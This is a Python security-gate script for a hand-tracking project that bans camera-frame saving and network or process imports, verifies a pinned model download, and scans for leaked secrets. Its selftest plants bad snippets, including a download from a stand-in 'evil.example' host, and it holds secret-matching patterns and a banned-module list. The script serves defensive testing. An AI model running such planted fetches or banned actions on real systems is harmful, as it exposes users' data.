#!/usr/bin/env python3
"""Privacy and supply-chain gate for Robot Teaches Human.

Run: .venv/bin/python scripts/security_check.py            (exit 0 = clean, 1 = findings)
     .venv/bin/python scripts/security_check.py --selftest  (proves it fails on planted bad code)
     .venv/bin/python scripts/security_check.py --root DIR  (check another tree, same layout)

Rules (see tasks/threat-model.md):
  1. hand/ never saves or encodes camera frames: no imwrite/imencode/VideoWriter/tempfile,
     no write-mode open(), no np.save*/tofile/pickle.dump, no Path.write_*.
  2. hand/ has no network or process-spawning imports. The ONLY exception is hand/model_fetch.py,
     which may import urllib.request to download the pinned HandLandmarker model, and must
     verify the sha256 and use an official Google MediaPipe URL.
  3. No env file is tracked and no tracked file contains an API-key-looking string.
  4. requirements.txt pins every dependency with ==.
  5. If models/hand_landmarker.task exists it matches models/hand_landmarker.sha256.
"""
from __future__ import annotations

import argparse
import ast
import hashlib
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
FETCH_NAME = "model_fetch.py"
OFFICIAL_URL_PREFIX = "https://storage.googleapis.com/mediapipe-models/"

BANNED_IMPORTS = {
    "requests", "urllib", "urllib3", "socket", "http", "httpx", "aiohttp", "ftplib", "smtplib",
    "telnetlib", "websocket", "websockets", "xmlrpc", "ssl", "subprocess", "tempfile", "webbrowser",
}
FETCH_ALLOWED_IMPORTS = {"urllib", "ssl"}  # urllib.request only, checked below
BANNED_CALLS = {  # attribute or bare name
    "imwrite", "imwritemulti", "imencode", "VideoWriter", "VideoWriter_fourcc",
    "savez", "savez_compressed", "savetxt", "tofile", "dump", "dumps",
    "write_bytes", "write_text", "system", "popen", "mkstemp", "mkdtemp",
    "NamedTemporaryFile", "TemporaryFile", "TemporaryDirectory", "SpooledTemporaryFile",
}
# `save` is only banned on numpy / PIL style receivers (np.save, img.save), not any method called save.
SAVE_RECEIVERS = {"np", "numpy", "Image", "PIL", "cv2", "plt", "img", "image", "frame", "im"}

SECRET_PATTERNS = [
    re.compile(r"sk-ant-[A-Za-z0-9_\-]{10,}"),
    re.compile(r"\bsk-[A-Za-z0-9]{20,}"),
    re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(r"\beyJ[A-Za-z0-9_\-]{15,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}"),  # JWT-style keys
    re.compile(r"(?i)\b(api[_-]?key|secret|token|password)\b\s*[=:]\s*['\"][A-Za-z0-9_\-\.\/+]{20,}['\"]"),
    re.compile(r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----"),
]


class Findings(list):
    def add(self, where: str, msg: str) -> None:
        self.append(f"{where}: {msg}")


def _open_mode_writes(call: ast.Call) -> bool:
    """True if an open()/Path.open() call can write (or its mode is not a literal)."""
    mode = None
    if len(call.args) >= 2:
        mode = call.args[1]
    for kw in call.keywords:
        if kw.arg == "mode":
            mode = kw.value
    if mode is None:
        return False
    if isinstance(mode, ast.Constant) and isinstance(mode.value, str):
        return any(c in mode.value for c in "wax+")
    return True  # computed mode: assume the worst


def _call_name(call: ast.Call) -> tuple[str | None, str | None]:
    f = call.func
    if isinstance(f, ast.Name):
        return None, f.id
    if isinstance(f, ast.Attribute):
        recv = f.value.id if isinstance(f.value, ast.Name) else None
        return recv, f.attr
    return None, None


def scan_python(path: Path, rel: str, is_fetch: bool, out: Findings) -> None:
    try:
        tree = ast.parse(path.read_text(), filename=rel)
    except SyntaxError as e:
        out.add(rel, f"does not parse ({e.msg}, line {e.lineno}); cannot be checked")
        return
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            mods = [a.name for a in node.names] if isinstance(node, ast.Import) else [node.module or ""]
            if isinstance(node, ast.ImportFrom) and node.level:  # relative import: from . import x
                continue
            for m in mods:
                top = m.split(".")[0]
                if top not in BANNED_IMPORTS:
                    continue
                if is_fetch and top in FETCH_ALLOWED_IMPORTS:
                    if top == "urllib" and m != "urllib.request" and not (
                        isinstance(node, ast.ImportFrom) and node.module == "urllib"
                        and all(a.name == "request" for a in node.names)
                    ):
                        out.add(f"{rel}:{node.lineno}", f"model_fetch may import only urllib.request, saw '{m}'")
                    continue
                out.add(f"{rel}:{node.lineno}", f"banned import '{m}' (no network/process/temp files in hand/)")
        elif isinstance(node, ast.Call):
            recv, name = _call_name(node)
            if name is None:
                continue
            if name == "open" and _open_mode_writes(node):
                if not is_fetch:
                    out.add(f"{rel}:{node.lineno}", "write-mode open() in hand/")
            elif name in BANNED_CALLS:
                if name in {"dump", "dumps"} and recv not in {"pickle", "marshal", "joblib", "dill"}:
                    continue  # json.dumps etc. are fine
                if name in {"write_bytes", "write_text"} and is_fetch:
                    continue
                out.add(f"{rel}:{node.lineno}", f"banned call '{name}' (camera frames must stay in memory)")
            elif name == "save" and recv in SAVE_RECEIVERS:
                out.add(f"{rel}:{node.lineno}", f"'{recv}.save' would write data to disk")
        elif isinstance(node, ast.Name) and node.id in {"imwrite", "VideoWriter"}:
            out.add(f"{rel}:{node.lineno}", f"reference to '{node.id}'")


def check_fetch_helper(path: Path, rel: str, pinned: str | None, out: Findings) -> None:
    src = path.read_text()
    tree = ast.parse(src)
    imported = {a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    imported |= {(n.module or "").split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and not n.level}
    if "cv2" in imported or "mediapipe" in imported:
        out.add(rel, "the download helper must not import cv2/mediapipe (keep it isolated from camera code)")
    if "hashlib" not in imported or "sha256" not in src:
        out.add(rel, "download helper must verify the file with hashlib.sha256")
    if pinned and pinned not in src and "hand_landmarker.sha256" not in src:
        out.add(rel, "helper must pin the sha256 (literal hash or read of models/hand_landmarker.sha256)")
    urls = re.findall(r"https?://[^\s'\"]+", src)
    if not urls:
        out.add(rel, "no URL literal found; expected the official MediaPipe model URL")
    for u in urls:
        if not u.startswith(OFFICIAL_URL_PREFIX):
            out.add(rel, f"URL not under {OFFICIAL_URL_PREFIX}: {u}")


def check_hand(root: Path, pinned: str | None, out: Findings) -> None:
    hand = root / "hand"
    if not hand.is_dir():
        out.add("hand/", "directory missing")
        return
    files = sorted(hand.rglob("*.py"))
    fetchers = [p for p in files if p.name == FETCH_NAME]
    if len(fetchers) > 1 or any(p.parent != hand for p in fetchers):
        out.add("hand/", f"{FETCH_NAME} must exist once, directly in hand/ (found {len(fetchers)})")
    for p in files:
        rel = str(p.relative_to(root))
        scan_python(p, rel, is_fetch=(p.parent == hand and p.name == FETCH_NAME), out=out)
    for p in fetchers:
        if p.parent == hand:
            check_fetch_helper(p, str(p.relative_to(root)), pinned, out)
    # Non-Python files in hand/ that could smuggle code or data
    for p in hand.rglob("*"):
        if p.is_file() and p.suffix not in {".py", ".pyc", ".md", ".txt", ".json"} and "__pycache__" not in p.parts:
            out.add(str(p.relative_to(root)), "unexpected non-Python file in hand/")
    # The model loader must go through the verified helper
    uses_landmarker = any("HandLandmarker" in p.read_text() for p in files if p.name != FETCH_NAME)
    if uses_landmarker and not any("model_fetch" in p.read_text() for p in files if p.name != FETCH_NAME):
        out.add("hand/", "HandLandmarker is used but nothing imports model_fetch (unverified model file)")


def _git(root: Path, *args: str) -> list[str] | None:
    try:
        r = subprocess.run(["git", "-C", str(root), *args], capture_output=True, text=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        return None
    return [ln for ln in r.stdout.splitlines() if ln]


def check_secrets(root: Path, out: Findings) -> None:
    tracked = _git(root, "ls-files")
    if tracked is None:
        out.add("git", "not a git work tree; cannot list tracked files")
        return
    for f in tracked:
        if re.search(r"\.env", f):
            out.add(f, "env file is tracked (git ls-files | grep -E '\\.env' must be empty)")
        p = root / f
        if f == "scripts/security_check.py" or not p.is_file():
            continue
        try:
            text = p.read_text()
        except (UnicodeDecodeError, OSError):
            continue
        for pat in SECRET_PATTERNS:
            m = pat.search(text)
            if m:
                line = text.count("\n", 0, m.start()) + 1
                out.add(f"{f}:{line}", f"looks like a secret ({pat.pattern[:28]}...); value not printed")
                break
    ignored = _git(root, "check-ignore", ".env.local", "x.task")
    if ignored is not None and ".env.local" not in ignored:
        out.add(".gitignore", ".env.local is not ignored")


def check_requirements(root: Path, out: Findings) -> None:
    req = root / "requirements.txt"
    if not req.is_file():
        out.add("requirements.txt", "missing")
        return
    for i, raw in enumerate(req.read_text().splitlines(), 1):
        line = raw.split("#")[0].strip()
        if not line:
            continue
        if line.startswith(("-", "http", "git+")) or not re.fullmatch(r"[A-Za-z0-9_.\-\[\]]+==[A-Za-z0-9_.+!]+(\s*--hash=\S+)*", line):
            out.add(f"requirements.txt:{i}", f"'{line}' is not an exact == pin")


def read_pin(root: Path) -> str | None:
    f = root / "models" / "hand_landmarker.sha256"
    if not f.is_file():
        return None
    m = re.match(r"([0-9a-f]{64})\b", f.read_text().strip())
    return m.group(1) if m else None


def check_model(root: Path, pinned: str | None, out: Findings) -> None:
    if pinned is None:
        out.add("models/hand_landmarker.sha256", "missing or not a 64-hex sha256")
        return
    task = root / "models" / "hand_landmarker.task"
    if task.is_file():
        got = hashlib.sha256(task.read_bytes()).hexdigest()
        if got != pinned:
            out.add("models/hand_landmarker.task", f"sha256 {got[:12]}... does not match pinned {pinned[:12]}...")


def run(root: Path) -> Findings:
    out = Findings()
    pinned = read_pin(root)
    check_hand(root, pinned, out)
    check_secrets(root, out)
    check_requirements(root, out)
    check_model(root, pinned, out)
    return out


BAD_EXAMPLES = {
    "imwrite": "import cv2\ndef f(frame):\n    cv2.imwrite('x.png', frame)\n",
    "VideoWriter": "import cv2\nw = cv2.VideoWriter('o.mp4', 0, 30, (640, 480))\n",
    "tempfile": "import tempfile\nt = tempfile.NamedTemporaryFile()\n",
    "open-wb": "def f(b):\n    open('frame.bin', 'wb').write(b)\n",
    "requests": "import requests\nrequests.post('http://example.com', data=b'x')\n",
    "socket": "from socket import socket\ns = socket()\n",
    "urllib-outside-fetch": "import urllib.request\nurllib.request.urlopen('http://example.com')\n",
    "np.save": "import numpy as np\nnp.save('f.npy', np.zeros(3))\n",
}


def selftest() -> int:
    ok = True
    tmp = Path(tempfile.mkdtemp(prefix="secchk-"))
    try:
        for name, src in BAD_EXAMPLES.items():
            d = tmp / name
            (d / "hand").mkdir(parents=True)
            (d / "hand" / "bad.py").write_text(src)
            f = Findings()
            check_hand(d, None, f)
            status = "caught" if f else "MISSED"
            ok &= bool(f)
            print(f"  planted {name:<22} -> {status}" + (f"  [{f[0]}]" if f else ""))
        # A fetch helper that is NOT verified or uses a foreign URL must fail; a correct one must pass.
        d = tmp / "fetch"
        (d / "hand").mkdir(parents=True)
        (d / "hand" / FETCH_NAME).write_text("import urllib.request\nurllib.request.urlopen('http://evil.example/m.task')\n")
        f = Findings()
        check_hand(d, "a" * 64, f)
        ok &= bool(f)
        print(f"  planted bad model_fetch        -> {'caught' if f else 'MISSED'}" + (f"  [{f[0]}]" if f else ""))
        (d / "hand" / FETCH_NAME).write_text(
            "import hashlib\nimport urllib.request\n"
            f"URL = '{OFFICIAL_URL_PREFIX}hand_landmarker/hand_landmarker/float16/1/hand_landmarker.task'\n"
            "PIN_FILE = 'models/hand_landmarker.sha256'\n"
            "def fetch(dest, expected):\n"
            "    data = urllib.request.urlopen(URL).read()\n"
            "    if hashlib.sha256(data).hexdigest() != expected: raise ValueError('hash')\n"
            "    open(dest, 'wb').write(data)\n"
        )
        f = Findings()
        check_hand(d, "a" * 64, f)
        ok &= not f
        print(f"  good model_fetch               -> {'passes' if not f else 'WRONGLY FAILED ' + str(list(f))}")
        # Secret and env detection in a throwaway git repo
        g = tmp / "git"
        g.mkdir()
        subprocess.run(["git", "-C", str(g), "init", "-q"], check=True)
        (g / ".env.local").write_text("X=1\n")
        (g / "notes.txt").write_text("key = '" + "sk-" + "a" * 30 + "'\n")
        subprocess.run(["git", "-C", str(g), "add", "-f", "."], check=True)
        f = Findings()
        check_secrets(g, f)
        ok &= len(f) >= 2
        print(f"  tracked .env + key string      -> {'caught' if len(f) >= 2 else 'MISSED'} ({len(f)} findings)")
        (g / "requirements.txt").write_text("numpy>=2\nrequests\n")
        f = Findings()
        check_requirements(g, f)
        ok &= len(f) == 2
        print(f"  unpinned requirements          -> {'caught' if len(f) == 2 else 'MISSED'}")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    print("selftest:", "PASS (every planted violation was caught)" if ok else "FAIL")
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--root", type=Path, default=REPO)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()
    findings = run(args.root.resolve())
    if findings:
        print(f"security_check: FAIL ({len(findings)} finding(s))")
        for f in findings:
            print("  -", f)
        return 1
    print("security_check: OK (no frame saving, no network in hand/, no tracked secrets, pins + model hash good)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
